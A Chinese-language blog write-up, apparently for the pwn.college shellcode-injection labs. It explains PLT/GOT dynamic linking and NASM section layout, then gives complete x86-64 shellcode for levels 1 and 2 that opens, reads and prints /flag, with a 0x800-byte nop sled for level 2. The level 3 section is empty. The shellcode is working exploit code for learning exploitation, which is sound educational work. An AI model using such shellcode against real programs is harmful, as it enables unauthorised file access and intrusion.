---
title: PWN-College-Shellcode-Injection-Writeup
date: 2024-07-09 11:02:00
author: 美食家李老叭
img: https://laboratory-1304292449.cos.ap-nanjing.myqcloud.com/note/20240709193107.png
top: false
hide: false
cover: false
coverImg: 
password: 
toc: true
mathjax: false
summary: CTF 
categories: CTF
tags:
    - 逆向
---
# pwn.college Shellcode-Injection

https://pwn.college/program-security/shellcode-injection/

## 有价值的问题

### PLT 和 GOT 有什么区别和联系

PLT(Procedure Linkage Table) 和 GOT（Global offset Table）是ELF(Executable and Linkable Format)文件中用于动态链接的重要机制。他们协同工作来实现动态库函数的调用。

PLT(Procedure Linkage Table)
- 位置：PLT位于可执行文件的代码段(.text段)中。
- 结构：PLT包含一系列跳转指令，这些指令在程序首次调用某个外部函数时，会跳转到一个存根stub代码，然后由动态链接器解析实际地址并修正跳转目标。
- 功能：延时绑定，PLT实现了延时绑定，即在程序运行时，只有在函数被第一次调用时，才会解析函数地址并跳转目标。PLT中的每个条目都是一个间接跳转，通过跳转到GOT中存储的地址来实现函数调用。

GOT(Global Offset Table)
- 位置：GOT位于可执行文件的数据段(.data段或.got段)中。
- 结构：GOT包含指向全局变量和外部函数地址的指针。在动态链接过程中，这些指针会被更新为实际的地址。
- 地址存储，GOT存储了外部函数和全局变量的实际地址，供程序在运行时使用。
- 动态链接：在程序加载时，动态链接器会解析并填充GOT表项。使得程序可以正确调用动态库中的函数和访问全局变量。


```c++
程序调用 -> PLT 条目 -> GOT 表项 -> 动态链接器 (第一次) -> 解析并更新 GOT/PLT -> 实际函数
          -> PLT 条目 -> GOT 表项 -> 实际函数 (后续)

GOT显示
./babyshell_level1:     file format elf64-x86-64

DYNAMIC RELOCATION RECORDS
OFFSET           TYPE              VALUE 
0000000000003d40 R_X86_64_RELATIVE  *ABS*+0x00000000000012e0
0000000000003d48 R_X86_64_RELATIVE  *ABS*+0x00000000000012a0
0000000000004008 R_X86_64_RELATIVE  *ABS*+0x0000000000004008
0000000000003fd8 R_X86_64_GLOB_DAT  _ITM_deregisterTMCloneTable
0000000000003fe0 R_X86_64_GLOB_DAT  __libc_start_main@GLIBC_2.2.5
0000000000003fe8 R_X86_64_GLOB_DAT  __gmon_start__
0000000000003ff0 R_X86_64_GLOB_DAT  _ITM_registerTMCloneTable
0000000000003ff8 R_X86_64_GLOB_DAT  __cxa_finalize@GLIBC_2.2.5
0000000000004010 R_X86_64_COPY     stdout@@GLIBC_2.2.5
0000000000004020 R_X86_64_COPY     stdin@@GLIBC_2.2.5
0000000000003f68 R_X86_64_JUMP_SLOT  putchar@GLIBC_2.2.5
0000000000003f70 R_X86_64_JUMP_SLOT  puts@GLIBC_2.2.5
0000000000003f78 R_X86_64_JUMP_SLOT  cs_free
0000000000003f80 R_X86_64_JUMP_SLOT  strlen@GLIBC_2.2.5
0000000000003f88 R_X86_64_JUMP_SLOT  __stack_chk_fail@GLIBC_2.4
0000000000003f90 R_X86_64_JUMP_SLOT  printf@GLIBC_2.2.5
0000000000003f98 R_X86_64_JUMP_SLOT  __assert_fail@GLIBC_2.2.5
0000000000003fa0 R_X86_64_JUMP_SLOT  memset@GLIBC_2.2.5
0000000000003fa8 R_X86_64_JUMP_SLOT  close@GLIBC_2.2.5
0000000000003fb0 R_X86_64_JUMP_SLOT  read@GLIBC_2.2.5
0000000000003fb8 R_X86_64_JUMP_SLOT  cs_disasm
0000000000003fc0 R_X86_64_JUMP_SLOT  setvbuf@GLIBC_2.2.5
0000000000003fc8 R_X86_64_JUMP_SLOT  cs_open
0000000000003fd0 R_X86_64_JUMP_SLOT  cs_close


PLT显示

babyshell_level1:     file format elf64-x86-64
Disassembly of section .plt:
0000000000001020 <.plt>:
    1020:       ff 35 32 2f 00 00       pushq  0x2f32(%rip)        # 3f58 <_GLOBAL_OFFSET_TABLE_+0x8>
    1026:       f2 ff 25 33 2f 00 00    bnd jmpq *0x2f33(%rip)        # 3f60 <_GLOBAL_OFFSET_TABLE_+0x10>
    102d:       0f 1f 00                nopl   (%rax)
    1030:       f3 0f 1e fa             endbr64 
    1034:       68 00 00 00 00          pushq  $0x0
    1039:       f2 e9 e1 ff ff ff       bnd jmpq 1020 <.plt>
    103f:       90                      nop
    1040:       f3 0f 1e fa             endbr64 
    1044:       68 01 00 00 00          pushq  $0x1
    1049:       f2 e9 d1 ff ff ff       bnd jmpq 1020 <.plt>
    104f:       90                      nop
    1050:       f3 0f 1e fa             endbr64 
    1054:       68 02 00 00 00          pushq  $0x2

```


### 为什么要同时设计PLT和GOT表项
设计 PLT（Procedure Linkage Table）和 GOT（Global Offset Table）的目的是为了实现动态链接的高效和灵活。虽然理论上可以只用 PLT 来实现动态链接，但分开设计 PLT 和 GOT 有多个好处，下面解释其中的原因。

动态链接的基本目标
- 延迟绑定（Lazy Binding）：在程序执行过程中，只在函数被首次调用时才解析其地址，减少启动时间。
- 位置无关代码（Position-Independent Code, PIC）：使得程序或共享库可以在内存中任意位置加载，提高内存利用率和安全性。
- 降低开销：减少每次调用动态函数时的性能开销。

为什么分开设计 PLT 和 GOT

1. 分离代码和数据：
    PLT：位于代码段，包含跳转指令和间接跳转表的索引。
    GOT：位于数据段，包含实际函数和变量地址。
    分离使得代码段可以保持只读，有助于提高安全性（如防止代码段被修改）。
2. 延迟绑定实现：
    首次调用：通过 PLT 条目跳转到 GOT 中的动态链接器解析函数。
    解析后：动态链接器更新 GOT 表项，指向实际函数地址。之后的调用直接通过 GOT 跳转到实际函数地址，减少开销。
    这种机制使得每个动态函数的地址只在第一次调用时解析一次，之后调用的开销很低。
3. 位置无关代码支持：
    GOT 表项：在加载时由动态链接器填充，提供实际地址，使得代码可以在任意位置加载。
    PLT 表项：通过相对地址引用 GOT 表项，实现位置无关。
4. 简化动态链接器实现：
    动态链接器可以集中管理 GOT 表项，解析并填充实际地址。
    更新 PLT 表项和 GOT 表项可以分别处理，简化动态链接器的逻辑。
5. 提高效率：
    运行时性能：首次调用动态函数时，通过 PLT 跳转到动态链接器处理，之后通过 GOT 直接跳转到函数地址，减少每次调用的性能开销。
    内存使用：数据段中的 GOT 可以在程序运行时动态修改，而代码段中的 PLT 可以保持只读，提高内存保护的有效性。

- PLT 和 GOT 的协同工作机制
    - PLT 条目：存储间接跳转指令，通过 GOT 表项获取实际函数地址。
    - GOT 表项：初始指向动态链接器解析函数，解析后指向实际函数地址。

```text
示例：调用 printf 函数的流程
1. 初始状态：
    PLT 表项指向 GOT 表项。
    GOT 表项指向动态链接器解析函数。
2. 第一次调用：
    调用 PLT 条目，跳转到 GOT 表项。
    GOT 表项指向动态链接器，解析 printf 的实际地址。
    动态链接器更新 GOT 表项，指向 printf 的实际地址。
3. 后续调用：
    PLT 通过 GOT 表项直接跳转到 printf 的实际地址。
```

- 总结
PLT 和 GOT 分开设计的主要原因是为了实现高效、灵活和安全的动态链接机制。通过分离代码和数据、支持延迟绑定和位置无关代码，PLT 和 GOT 提供了一种有效的动态链接解决方案。虽然理论上可以只用 PLT，但分开设计带来了更好的性能和安全性。


### nasm在编译汇编语言的时候，会把汇编代码中各个段放在二进制的什么位置？

在使用 NASM 编译汇编代码时，汇编器会将各个段（section）放置在目标文件中的不同位置。具体位置取决于目标文件格式，例如二进制文件、ELF 文件或其他格式。以下是几种常见目标文件格式及其段的放置位置和排列方式：

1. 二进制文件格式（-f bin）
二进制文件格式是最简单的格式，所有段都直接放在输出文件中，没有额外的头信息。

.text 段：通常放在文件的起始位置。
.data 段：紧随 .text 段之后。
.bss 段：紧随 .data 段之后，但由于 .bss 段不包含初始化数据，通常在二进制文件中没有对应的部分，而是留出相应的空间。

```diff
+-------------------+
| .text 段 (代码)   |
+-------------------+
| .data 段 (已初始化数据) |
+-------------------+
```

2. ELF 文件格式（-f elf64）
ELF（Executable and Linkable Format）文件格式用于更复杂的可执行文件和共享库，包含详细的段信息和符号表。

.text 段：放在文件的代码段，包含可执行代码。
.data 段：放在文件的数据段，包含已初始化的数据。
.bss 段：放在文件的未初始化数据段，在运行时初始化为零。

```diff
+-------------------+
| ELF 文件头        |
+-------------------+
| 程序头表         |
+-------------------+
| .text 段 (代码)   |
+-------------------+
| .data 段 (已初始化数据) |
+-------------------+
| .bss 段 (未初始化数据)  |
+-------------------+
| 段头表           |
+-------------------+
```

### 

## level1

这个题可以用nasm直接编译汇编语言，我居然还在用python，写汇编语言的二进制表示然后再写入文件中。因为我卡在了不知道把字符串应该放在哪里？到底是放在baby程序的栈中，还是放在我的代码的最后部分。其实是一致的，因为你所有的输入都在baby程序的栈中，只不过位置不同。

nasm编译汇编语言，居然可以指定段中的数据。而且这里使用的都是系统调用，不用再通过plt段获取一些动态链接函数的地址了。

利用程序
```asm
BITS 64

section .data
    filename db '/flag', 0    ; 文件路径需要替换为正确的路径

section .bss
    buffer resb 100                   ; 100 字节缓冲区

section .text
global _start

_start:
    ; open("filename", O_RDONLY)
    xor rax, rax
    mov rax, 2                        ; SYS_open
    lea rdi, [rel filename]
    xor rsi, rsi                      ; O_RDONLY = 0
    syscall

    ; 检查 open 的返回值
    test rax, rax
    js error                          ; 如果打开文件失败，跳转到错误处理

    ; read(fd, buffer, 100)
    mov rdi, rax                      ; fd
    lea rsi, [rel buffer]
    mov rdx, 100                      ; 读取 100 字节
    xor rax, rax                      ; SYS_read
    syscall

    ; write(1, buffer, rax)
    mov rdi, 1                        ; stdout
    mov rdx, rax                      ; 读取的字节数
    mov rax, 1                        ; SYS_write
    syscall

    ; exit(0)
    xor rdi, rdi                      ; 返回码 0
    mov rax, 60                       ; SYS_exit
    syscall

error:
    ; exit(1)
    mov rdi, 1                        ; 返回码 1
    mov rax, 60                       ; SYS_exit
    syscall
```

## level2

这一关相较于上一关，在shellcode运行之前，程序随机跳过开始的0x800个字节。所以我们需要在程序开始之前的0x800个字节添加NOP指令。

```c
puts("Executing filter...\n");
puts("This challenge will randomly skip up to 0x800 bytes in your shellcode. You better adapt to that! One way to evade this");
puts("is to have your shellcode start with a long set of single-byte instructions that do nothing, such as `nop`, before the");
puts("actual functionality of your code begins. When control flow hits any of these instructions, they will all harmlessly");
puts("execute and then your real shellcode will run. This concept is called a `nop sled`.\n");
srand(time(NULL));
int to_skip = (rand() % 0x700) + 0x100;
shellcode_mem += to_skip;
shellcode_size -= to_skip;
```

利用代码
```asm
BITS 64

section .data
    filename db '/flag', 0    ; 文件路径需要替换为正确的路径

section .bss
    buffer resb 100                   ; 100 字节缓冲区

section .text
global _start


; 在 .text 段前插入 0x800 个 nop 指令
nop_space:
    times 0x800 nop           ; 0x800 个 nop 指令

_start:
    ; open("filename", O_RDONLY)
    xor rax, rax
    mov rax, 2                        ; SYS_open
    lea rdi, [rel filename]
    xor rsi, rsi                      ; O_RDONLY = 0
    syscall

    ; 检查 open 的返回值
    test rax, rax
    js error                          ; 如果打开文件失败，跳转到错误处理

    ; read(fd, buffer, 100)
    mov rdi, rax                      ; fd
    lea rsi, [rel buffer]
    mov rdx, 100                      ; 读取 100 字节
    xor rax, rax                      ; SYS_read
    syscall

    ; write(1, buffer, rax)
    mov rdi, 1                        ; stdout
    mov rdx, rax                      ; 读取的字节数
    mov rax, 1                        ; SYS_write
    syscall

    ; exit(0)
    xor rdi, rdi                      ; 返回码 0
    mov rax, 60                       ; SYS_exit
    syscall

error:
    ; exit(1)
    mov rdi, 1                        ; 返回码 1
    mov rax, 60                       ; SYS_exit
    syscall

```


## level3


##